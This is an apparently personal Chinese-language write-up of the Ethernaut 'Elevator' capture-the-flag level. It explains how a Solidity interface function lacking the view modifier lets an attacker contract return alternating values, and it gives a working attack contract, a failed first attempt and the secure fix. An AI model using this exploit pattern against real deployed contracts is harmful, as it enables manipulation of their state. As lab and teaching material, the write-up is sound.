# 11-Elevator

日期: 19/08/2024
漏洞小结: 没有使用view
简单明了: 改写Interface合约来绕过If condition
难易: 困难

# 问题描述

This elevator won't let you reach the top of your building. Right?

### **Things that might help:**

- Sometimes solidity is not good at keeping promises.
- This `Elevator` expects to be used from a `Building`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

# 攻击思路

攻破这个靶机两个关键点

1. isLastFloor这个函数，如果要条件成立的话进入到if的画，需要return false。如果什么也不做，那么top也就是false。所以需要让它满足条件的时候是false，然后进去之后会变成true

```bash
        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
```

1. 要实现第一点，那么就只能把Interface写成contract然后去部署一遍了，每次调用之后实现让isLastFloor的值实现交替。

# 攻击方式

1. 把代码复制到remix，把interface写成contract，填充isLastFloor函数内容，让其交替返回true和false
2. 用remix的at address部署在目标实例(Elevator)的地址，然后进行才做即可
3. Building合约里面还需要带上目标victim合约的constructor，以及`attack`，需要让部署的Building合约去调用`isLastFloor`，我们直接调用不行

代码如下

```solidity
contract Building {
    uint256 public count;
    Elevator victim;
    constructor(address _victim){
        victim = Elevator(_victim);
    }

    function isLastFloor(uint256) external returns (bool){
        count++;
        return count % 2 == 0;
    }

    function Attack() public {
        victim.goTo(2);
    }
}
```

# Ethernuat总结

You can use the `view` function modifier on an interface in order to prevent state modifications. The `pure` modifier also prevents functions from modifying the state. Make sure you read [Solidity's documentation](http://solidity.readthedocs.io/en/develop/contracts.html#view-functions) and learn its caveats.

An alternative way to solve this level is to build a view function which returns different results depends on input data but don't modify state, e.g. `gasleft()`.

# 小白的思考

其实蛮难的，虽然他只放了两颗星，可能有什么简单的做法我没搞清楚。

和之前不同的事，相较于重新写一个攻击脚本，这次我们要重新改写利用interface来写，并且两个合约在相互来回调用。刚开始没理解到这一点，攻击失败，以为在Elevator合约里面直接通过goTo函数就可以完成共计。

代码如下

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Building {
    uint256 public count = 0;
    function isLastFloor(uint256) external returns (bool){
        count++;
        return count % 2 == 0;
    }
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

然而实际上做不到，因为在调用goTo的时候时候，使用现有地址去创建Building实例。如果是我们去调用的话，那地址就是我们的。但是我们自己的地址压根没有`isLastFloor`函数，也就无法执行`building.isLastFloor` 。会回滚。

所以还是需要新建一个共计合约。

整个思考过程蛮绕的，不简单。

## EOA

EOA的概念有点忘记了，GPT帮我复习一下：

EOA（Externally Owned Account）即外部账户，是指由私钥控制的普通账户，通常由个人用户持有。EOA 的特点如下：

- **没有关联智能合约**：EOA 是由用户私钥直接控制的，不包含任何合约代码。
- **使用私钥签名交易**：你可以通过私钥签名来发起交易，比如发送以太币或调用智能合约的函数。
- **有 `msg.sender` 的身份**：在智能合约中，当 EOA 调用合约时，`msg.sender` 会被设置为这个 EOA 的地址。

相对于 EOA，另一个重要的概念是智能合约账户（Contract Account），它是由代码控制的账户，没有私钥控制，行为完全依赖合约代码。

回到你当前的挑战，你的 EOA 是你直接在 Remix 或其他钱包中控制的账户。当你从这个 EOA 直接调用 `Elevator` 合约时，`msg.sender` 是这个 EOA 的地址，但这个地址不实现 `isLastFloor` 函数，所以会导致合约调用失败。

通过让你的 `Building` 合约调用 `Elevator` 合约，`msg.sender` 就变成了 `Building` 合约的地址，解决了这个问题。

## View

去看了一下要注意点的点，以及解题完毕之后出现的知识点，（笑鼠）完全没有联系到。

这里需要注意的说明是，像是题中的interface 这种is开头的，return bool的函数，那么他就应该是view，不然的花就有可能被修改状态，导致漏洞

- 我们的攻击中我们修改了count的状态

比较安全的interface如下

```solidity
interface Building {
    function isLastFloor(uint256) external **view** returns (bool);
}
```